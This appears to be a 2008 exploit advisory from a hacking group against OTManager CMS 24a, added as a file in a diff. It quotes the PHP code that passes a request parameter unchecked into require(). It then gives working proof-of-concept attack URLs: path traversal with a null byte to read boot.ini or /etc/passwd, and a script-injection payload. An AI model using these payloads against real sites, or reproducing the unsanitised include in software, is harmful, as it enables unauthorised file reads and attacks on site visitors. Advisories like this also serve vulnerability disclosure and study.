@@ -1,0 +1,94 @@
+===========================================================
+  OTManager CMS (LFI/XSS) Multiple Remote Vulnerabilities
+===========================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 27 June 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : OTManager CMS
+ VERSION     : 24a Completo
+ VENDOR      : http://www.otmanager.org/
+ DOWNLOAD    : http://downloads.sourceforge.net/otm/OTManager_v24a_Completo.zip
+#####################################################
+
+---------------------------------------
+ Vulnerable File [index.php?conteudo=]
+---------------------------------------
+
+@Line
+
+   76:  if($_REQUEST['conteudo']==""){
+   77:  require("Principal.php");
+   78:  }else{
+   79:  if(!file_exists($_REQUEST['conteudo'].".php")){
+   80:  echo '<center><font size="3"><b>404 URL Invalida</b></font><br><br>Por Favor, Selecione o Conteudo no Menu ao Lado.</center>';
+   81:  }else{
+   82:       require($_REQUEST['conteudo'].".php");
+   83:       }
+   84:  }
+
+
+---------
+ Exploit
+---------
+
+#####
+ LFI
+#####
+
+[+] http://[Target]/[otmanager_path]/index.php?conteudo=[LFI]
+
+   
+    This exploit will open boot.ini in system file:
+
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+
+    You can change boot.ini to /etc/passwd%00 in linux OS, For view pass hash.
+
+#####
+ XSS
+#####
+
+[+] http://[Target]/[otmanager_path]/index.php?conteudo=[XSS]
+
+
+-------------
+ POC Exploit
+-------------
+
+#####
+ LFI
+#####
+
+[+] http://192.168.24.25/otmanager/index.php?conteudo=../../../../../../../../boot.ini%00
+
+#####
+ XSS
+#####
+
+[+] http://192.168.24.25/otmanager/index.php?conteudo=</title><script>alert('XSS test');</script>
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-27]
